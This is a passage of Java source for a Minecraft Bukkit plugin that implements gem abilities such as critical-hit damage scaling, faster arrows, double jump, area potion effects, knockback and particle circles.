                    ChadStrengthPlayer.getWorld().spawnParticle(Particle.VILLAGER_HAPPY, ChadStrengthPlayer.getLocation().add(0, 1, 0), 20, 0.5, 0.5, 0.5, 0);
                    data.set(ChadStrengthParticleCase1, PersistentDataType.INTEGER, 1);
                    data.set(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER, 1);
                    data.remove(ChadStrengthParticleCase4);
                    data.remove(ChadStrengthParticleCase3);
                    data.remove(ChadStrengthParticleCase2);
                }
            }
        }
    }

    @EventHandler
    public void ChadStrengthAttributes(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player player = (Player) event.getDamager();
            UUID playerId = player.getUniqueId();
            PersistentDataContainer data = player.getPersistentDataContainer();
            if (ChadStrengthCriticalHit(player)) {
                int count = ChadStrengthCritical.getOrDefault(playerId, 0) + 1;
                critCooldown.put(playerId, System.currentTimeMillis());
                if (player.getPersistentDataContainer().has(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER) && count == 4) {
                    data.set(ChadStrengthParticleCase1, PersistentDataType.INTEGER, 1);
                    data.remove(ChadStrengthParticleCase4);
                    data.remove(ChadStrengthParticleCase3);
                    data.remove(ChadStrengthParticleCase2);
                    player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(1.0);
                } else if (player.getPersistentDataContainer().has(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER) && count == 8) {
                    data.set(ChadStrengthParticleCase2, PersistentDataType.INTEGER, 1);
                    data.remove(ChadStrengthParticleCase4);
                    data.remove(ChadStrengthParticleCase3);
                    data.remove(ChadStrengthParticleCase1);
                    player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(2.0);
                } else if (player.getPersistentDataContainer().has(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER) && count == 12) {
                    data.set(ChadStrengthParticleCase3, PersistentDataType.INTEGER, 1);
                    data.remove(ChadStrengthParticleCase4);
                    data.remove(ChadStrengthParticleCase2);
                    data.remove(ChadStrengthParticleCase1);
                    player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(4.0);
                } else if (player.getPersistentDataContainer().has(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER) && count == 16) {
                    data.set(ChadStrengthParticleCase4, PersistentDataType.INTEGER, 1);
                    data.remove(ChadStrengthParticleCase3);
                    data.remove(ChadStrengthParticleCase2);
                    data.remove(ChadStrengthParticleCase1);
                    player.getAttribute(Attribute.GENERIC_ATTACK_DAMAGE).setBaseValue(8.0);
                    count = 0;
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            if (particleTasks.containsKey(playerId)) {
                                particleTasks.get(playerId).cancel();
                                particleTasks.remove(playerId);
                            }
                        }
                    }.runTaskLater(this, 800); // 40 seconds * 20 ticks per second
                }
                ChadStrengthCritical.put(playerId, count);
            }
        }
    }


    @EventHandler
    public void TerminalShooter(ProjectileLaunchEvent TerminalShooter) {
        if (TerminalShooter.getEntity() instanceof Arrow) {
            Arrow arrow = (Arrow) TerminalShooter.getEntity();
            ProjectileSource TerminalVelocityShooter = arrow.getShooter();
            if (TerminalVelocityShooter instanceof Player) {
                Player TerminalShooterPlayer = (Player) TerminalVelocityShooter;
                if (TerminalShooterPlayer.getPersistentDataContainer().has(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ, PersistentDataType.INTEGER)) {
                    Vector velocity = arrow.getVelocity();
                    Vector highSpeedVelocity = velocity.multiply(1.3);
                    arrow.setVelocity(highSpeedVelocity);
                }
            }
        }
    }

    @EventHandler
    public void PuffGemDoubleJump(PlayerToggleFlightEvent event) {
        Player DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ = event.getPlayer();
        ItemStack PuffGemItem = DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.getInventory().getItemInMainHand();
        PersistentDataContainer data = DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.getPersistentDataContainer();
        boolean ᴅᴏᴜʙʟᴇ_ᴊᴜᴍᴘ = data.getOrDefault(DᴏᴜʙʟᴇJᴜᴍᴘ, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
        if (PuffGem(PuffGemItem)) {
            if (!ᴅᴏᴜʙʟᴇ_ᴊᴜᴍᴘ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                data.set(DᴏᴜʙʟᴇJᴜᴍᴘ,PersistentDataType.INTEGER,1);
                long DoubleJumpCooldown = 5;
                PuffGem_Power_2_Enchanting.put(DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.getUniqueId(), DoubleJumpCooldown);
                PuffGemActionbar(DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ);
                event.setCancelled(true);
                DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.setAllowFlight(false);
                DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.setFlying(false);
                Vector jump = DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.getLocation().getDirection().multiply(0.5).setY(1);
                DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.setVelocity(jump);
                DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.getWorld().playSound(DᴏᴜʙʟᴇJᴜᴍᴘPʟᴀʏᴇʀ.getLocation(), org.bukkit.Sound.ENTITY_PLAYER_LEVELUP, 1, 1);
            }
        }
    }




    @EventHandler
    public void BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ(PlayerInteractEvent BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ) {
        Player BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ.getPlayer();
        ItemStack BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getInventory().getItemInMainHand();
        ItemStack BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍOғғHᴀɴᴅ = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getInventory().getItemInOffHand();
        Location BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getLocation();
        PersistentDataContainer data = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getPersistentDataContainer();
        boolean sᴛʀᴇɴɢᴛʜ_ᴄɪʀᴄʟᴇ = data.getOrDefault(SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
        boolean sᴛʀᴇɴɢᴛʜ_ʟɪɴᴇ = data.getOrDefault(StrengthLine, PersistentDataType.INTEGER, 0) == 1;
        boolean sᴘᴇᴇᴅ_ᴄɪʀᴄʟᴇ = data.getOrDefault(SᴘᴇᴇᴅCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
        boolean sᴘᴇᴇᴅ_ʟɪɴᴇ = data.getOrDefault(SpeedLine, PersistentDataType.INTEGER, 0) == 1;
        boolean ʟɪғᴇ_ᴄɪʀᴄʟᴇ = data.getOrDefault(LɪғᴇCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
        boolean ʟɪғᴇ_ʟɪɴᴇ = data.getOrDefault(LifeLine, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴡᴇᴀʟᴛʜ_ᴄɪʀᴄʟᴇ = data.getOrDefault(WᴇᴀʟᴛʜCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴡᴇᴀʟᴛʜ_ʟɪɴᴇ = data.getOrDefault(WealthLine, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴘᴜғғ_ᴄɪʀᴄʟᴇ = data.getOrDefault(PᴜғғCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴘᴜғғ_ʟɪɴᴇ = data.getOrDefault(PuffLine, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴛᴇʀᴍɪɴᴀʟ_ᴠᴇʟᴏᴄɪᴛʏ_ᴄᴏᴏʟᴅᴏᴡɴ = data.getOrDefault(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴛᴇʀᴍɪɴᴀʟ_ᴠᴇʟᴏᴄɪᴛʏ = data.getOrDefault(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ, PersistentDataType.INTEGER, 0) == 1;
        boolean ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
        if (BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.isSneaking() && BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ.getAction() == Action.RIGHT_CLICK_AIR || BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.isSneaking() && BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (SpeedGem(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍOғғHᴀɴᴅ)) {
                if (!ᴛᴇʀᴍɪɴᴀʟ_ᴠᴇʟᴏᴄɪᴛʏ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    data.set(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ, PersistentDataType.INTEGER, 1);
                    data.set(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ, PersistentDataType.INTEGER, 1);
                    long SpeedCircleCooldown = 35;
                    SpeedGem_Power_2_Enchanting.put(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getUniqueId(), SpeedCircleCooldown);
                    SpeedGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                    BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have used " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "Terminal Velocity");
                    BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(6.0);
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ);
                            BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(4.0);
                        }
                    }.runTaskLater(this, 100);
                }
            }
        }
        if (BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ.getAction() == Action.LEFT_CLICK_AIR || BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇ.getAction() == Action.LEFT_CLICK_BLOCK) {
            if (StrengthGem(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ)) {
                if (!sᴛʀᴇɴɢᴛʜ_ᴄɪʀᴄʟᴇ && !sᴛʀᴇɴɢᴛʜ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    data.set(SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 1);
                    ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ.getItemMeta();
                    if (meta != null && meta.hasCustomModelData()) {
                        int CustomModelData = meta.getCustomModelData();
                        int radius = StrengthGemCustomModelData(CustomModelData);
                        if (radius > 0) {
                        int StrengthGemCustomModelData = meta.getCustomModelData();
                            long StrengthCircleCooldown;
                            switch (StrengthGemCustomModelData) {
                                case 10, 30 -> StrengthCircleCooldown = 240L;
                                case 50 -> StrengthCircleCooldown = 360L;
                                case 70, 90 -> StrengthCircleCooldown = 480L;
                                    default ->
                                {return;}
                            }
                            StrengthGem_Power_1_StrengthCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getUniqueId(), StrengthCircleCooldown);
                            StrengthGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                            StrengthCircleRadius(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ, radius);
                            PrimaryRGBParticleCircle(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 241, 3, 3, radius);
                            PrimaryRGBParticleCircleLess(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 241, 3, 3, radius);
                            for (Entity entity : BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getNearbyEntities(radius, radius, radius)) {
                                LivingEntity livingEntity = (LivingEntity) entity;
                                if (entity instanceof LivingEntity && !entity.equals(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ)) {
                                    for (PotionEffect effect : livingEntity.getActivePotionEffects()) {
                                        livingEntity.removePotionEffect(effect.getType());
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (SpeedGem(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ)) {
                if (!sᴘᴇᴇᴅ_ᴄɪʀᴄʟᴇ && !sᴘᴇᴇᴅ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ.getItemMeta();
                if (meta != null && meta.hasCustomModelData()) {
                    int CustomModelData = meta.getCustomModelData();
                    int radius = SpeedGemCustomModelData(CustomModelData);
                    if (radius > 0) {
                            data.set(SᴘᴇᴇᴅCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 1);
                            int SpeedGemCustomModelData = meta.getCustomModelData();
                            long SpeedCircleCooldown;
                            switch (SpeedGemCustomModelData) {
                                case 8, 28 -> SpeedCircleCooldown = 240L;
                                case 48 -> SpeedCircleCooldown = 360L;
                                case 68, 88 -> SpeedCircleCooldown = 480L;
                                default ->
                                {return;}
                            }
                            SpeedGem_Power_1_SpeedCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getUniqueId(), SpeedCircleCooldown);
                            SpeedGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                            SpeedCircleRadius(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ, radius);
                            PrimaryRGBParticleCircle(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 254, 253, 23, radius);
                            PrimaryRGBParticleCircleLess(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 254, 253, 23, radius);
                            for (Entity entity : BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getNearbyEntities(radius, radius, radius)) {
                                LivingEntity livingEntity = (LivingEntity) entity;
                                if (entity instanceof LivingEntity && !entity.equals(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ)) {
                                    ((LivingEntity) entity).addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 200, 1));
                                    ((LivingEntity) entity).addPotionEffect(new PotionEffect(PotionEffectType.SLOW_DIGGING, 200, 1));
                                    livingEntity.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have been affected by group " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAFSloth's Sedative " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "by " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getName());
                                }
                            }
                        }
                    }
                }
            }
            if (LifeGem(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ)) {
                if (!ʟɪғᴇ_ᴄɪʀᴄʟᴇ && !ʟɪғᴇ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ.getItemMeta();
                if (meta != null && meta.hasCustomModelData()) {
                    int CustomModelData = meta.getCustomModelData();
                    int radius = LifeGemCustomModelData(CustomModelData);
                    if (radius > 0) {
                            data.set(LɪғᴇCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 1);
                            int LifeGemCustomModelData = meta.getCustomModelData();
                            long LifeCircleCooldown;
                            switch (LifeGemCustomModelData) {
                                case 4, 24 -> LifeCircleCooldown = 150L;
                                case 44 -> LifeCircleCooldown = 175L;
                                case 64, 84 -> LifeCircleCooldown = 215L;
                                default ->
                                {return;}
                            }
                            LifeGem_Power_1_LifeCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getUniqueId(), LifeCircleCooldown);
                            LifeGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                            LifeCircleRadius(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ, radius);
                            PrimaryRGBParticleCircle(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 254, 4, 180, radius);
                            PrimaryRGBParticleCircleLess(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 254, 4, 180, radius);
                            for (Entity entity : BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getNearbyEntities(radius, radius, radius)) {
                                LivingEntity livingEntity = (LivingEntity) entity;
                                if (entity instanceof LivingEntity && !entity.equals(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ)) {
                                    ((LivingEntity) entity).addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 200, 1));
                                    ((LivingEntity) entity).addPotionEffect(new PotionEffect(PotionEffectType.SLOW_DIGGING, 200, 1));
                                    livingEntity.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have been affected by group " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAFSloth's Sedative " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "by " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getName());
                                }
                            }
                        }
                    }
                }
            }
            if (WealthGem(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ)) {
                if (!ᴡᴇᴀʟᴛʜ_ᴄɪʀᴄʟᴇ && !ᴡᴇᴀʟᴛʜ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ.getItemMeta();
                if (meta != null && meta.hasCustomModelData()) {
                    int CustomModelData = meta.getCustomModelData();
                    int radius = WealthGemCustomModelData(CustomModelData);
                    if (radius > 0) {
                            data.set(WᴇᴀʟᴛʜCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 1);
                            int WealthGemCustomModelData = meta.getCustomModelData();
                            long WealthLineCooldown;
                            switch (WealthGemCustomModelData) {
                                case 12 -> WealthLineCooldown = 230L;
                                case 32 -> WealthLineCooldown = 250L;
                                case 52 -> WealthLineCooldown = 280L;
                                case 72, 92 -> WealthLineCooldown = 320L;
                                    default ->
                                    {return;}
                            }
                            WealthGem_Power_1_WealthCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getUniqueId(), WealthLineCooldown);
                            WealthGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                            WealthCircleRadius(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ, radius);
                            PrimaryRGBParticleCircle(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 14, 201, 18, radius);
                            PrimaryRGBParticleCircleLess(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 14, 201, 18, radius);
                            for (Entity entity : BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getNearbyEntities(radius, radius, radius)) {
                                if (entity instanceof LivingEntity && !entity.equals(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ)) {
                                    entity.getPersistentDataContainer().set(UNFORTUNATE_KEY, PersistentDataType.INTEGER, 1);
                                }
                            }
                        }
                    }
                }
            }
            if (PuffGem(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ)) {
                if (!ᴘᴜғғ_ᴄɪʀᴄʟᴇ && !ᴘᴜғғ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇIᴛᴇᴍ.getItemMeta();
                if (meta != null && meta.hasCustomModelData()) {
                    int CustomModelData = meta.getCustomModelData();
                    int radius = PuffGemCustomModelData(CustomModelData);
                    if (radius > 0) {
                            data.set(PᴜғғCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 1);
                            int PuffGemCustomModelData = meta.getCustomModelData();
                            long PuffCircleCooldown;
                            switch (PuffGemCustomModelData) {
                                case 6, 26 -> PuffCircleCooldown = 45L;
                                case 46, 66 -> PuffCircleCooldown = 75L;
                                case 86 -> PuffCircleCooldown = 95L;
                                default ->
                                {return;}
                            }
                            PuffGem_Power_1_PuffCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getUniqueId(), PuffCircleCooldown);
                            PuffGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                            PuffCircleRadius(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ, radius);
                            PrimaryRGBParticleCircle(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 249, 249, 249, radius);
                            PrimaryRGBParticleCircleLess(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇLᴏᴄᴀᴛɪᴏɴ, 249, 249, 249, radius);
                            for (Entity entity : BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ.getNearbyEntities(radius, radius, radius)) {
                                if (entity instanceof LivingEntity && !entity.equals(BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ)) {
                                    pushEntity((LivingEntity) entity, BʟɪssPᴀʀᴛɪᴄʟᴇCɪʀᴄʟᴇPʟᴀʏᴇʀ);
                                }
                            }
                        }
                    }
                }
            }




            final int[] a = {0};
            new BukkitRunnable() {
                @Override
                public void run() {
                    if (a[0] < 360) {
                        a[0]++;
                    } else {
                        cancel();
                    }
                }
            };
        }
    }

    private void PrimaryRGBParticleCircle(Location center, int r, int g, int b, double Radius) {
        final int repeatFinalRadius = 10;
        new BukkitRunnable() {
            double currentRadius = 1;

            @Override
            public void run() {
                if (currentRadius > Radius + 0.5) {
                    this.cancel();
                    new BukkitRunnable() {
                        int repeatCount = 0;

                        @Override
                        public void run() {
                            if (repeatCount >= repeatFinalRadius) {
                                this.cancel();
                                return;
                            }
                            MainRGBParticleCircle(center, r, g, b, Radius + 0.5);
                            repeatCount++;
                        }
                    }.runTaskTimer(BlissGems.this, 0, 5);
                    return;
                }
                MainRGBParticleCircle(center, r, g, b, currentRadius);
                currentRadius += 0.5;
            }
        }.runTaskTimer(this, 0, 0);
    }

    private void MainRGBParticleCircle(Location center, int r, int g, int b, double radius) {
        final double increment = Math.PI / 256; // Increase density of particles
        for (double angle = 0; angle < 4 * Math.PI; angle += increment) {
            double x = center.getX() + radius * Math.cos(angle);
            double z = center.getZ() + radius * Math.sin(angle);
            Location particleLocation = new Location(center.getWorld(), x, center.getY(), z);
            Particle.DustOptions BlissParticlesOption = new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1);
            for (Player player : center.getWorld().getPlayers()) {
                if (player.getPersistentDataContainer().has(BlissParticlesDefault, PersistentDataType.INTEGER)) {
                    center.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 0, 0, 0, 0, 0, BlissParticlesOption,true);
                    center.getWorld().spawnParticle(Particle.SMOKE_NORMAL, particleLocation, 0, 0, 0, 0, 0,null,true);
                }
            }
        }
    }

    private void PrimaryRGBParticleCircleLess(Location center, int r, int g, int b, double Radius) {
        final int repeatFinalRadius = 10;
        new BukkitRunnable() {
            double currentRadius = 1;

            @Override
            public void run() {
                if (currentRadius > Radius + 0.5) {
                    this.cancel();
                    new BukkitRunnable() {
                        int repeatCount = 0;

                        @Override
                        public void run() {
                            if (repeatCount >= repeatFinalRadius) {
                                this.cancel();
                                return;
                            }
                            MainRGBParticleCircleLess(center, r, g, b, Radius + 0.5);
                            repeatCount++;
                        }
                    }.runTaskTimer(BlissGems.this, 0, 5);
                    return;
                }
                MainRGBParticleCircleLess(center, r, g, b, currentRadius);
                currentRadius += 0.5;
            }
        }.runTaskTimer(this, 0, 0);
    }

    private void MainRGBParticleCircleLess(Location center, int r, int g, int b, double radius) {
        final double increment = Math.PI / 50; // Increase density of particles
        for (double angle = 0; angle < 8 * Math.PI; angle += increment) {
            double x = center.getX() + radius * Math.cos(angle);
            double z = center.getZ() + radius * Math.sin(angle);
            Location particleLocation = new Location(center.getWorld(), x, center.getY(), z);
            Particle.DustOptions BlissParticlesOption = new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1);
            center.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 0, 0, 0, 0, 0, BlissParticlesOption,true);
            center.getWorld().spawnParticle(Particle.SMOKE_NORMAL, particleLocation, 0, 0, 0, 0, 0,null, true);

        }
    }












    private void pushEntity(LivingEntity entity, Player player) {
        Location playerLocation = player.getLocation();
        Location entityLocation = entity.getLocation();
        Vector direction = entityLocation.toVector().subtract(playerLocation.toVector()).normalize();
        direction.setY(1);
        entity.setVelocity(direction.multiply(1.5));
    }





    private void playSoundAroundEntity(Player player) {
        Location location = player.getLocation();
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (p.getLocation().distance(location) <= 15) {
                p.playSound(location, Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    private UUID getUnfortunateUUID() {
        return UUID.randomUUID();
    }

    public void ChadStrengthSmoke() {
        particleTask = new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    Location eyeLocation = player.getEyeLocation();
                    Vector direction = eyeLocation.getDirection().normalize();
                    Vector LeftDirection = direction.clone().rotateAroundY(-Math.PI / 3).normalize();
                    Vector RightDirection = direction.clone().rotateAroundY(-Math.PI / -3).normalize();

                    Location frontSmokeLocation = eyeLocation.clone().add(direction.multiply(0.6));
                    Location LeftSmokeLocation = eyeLocation.clone().add(LeftDirection);
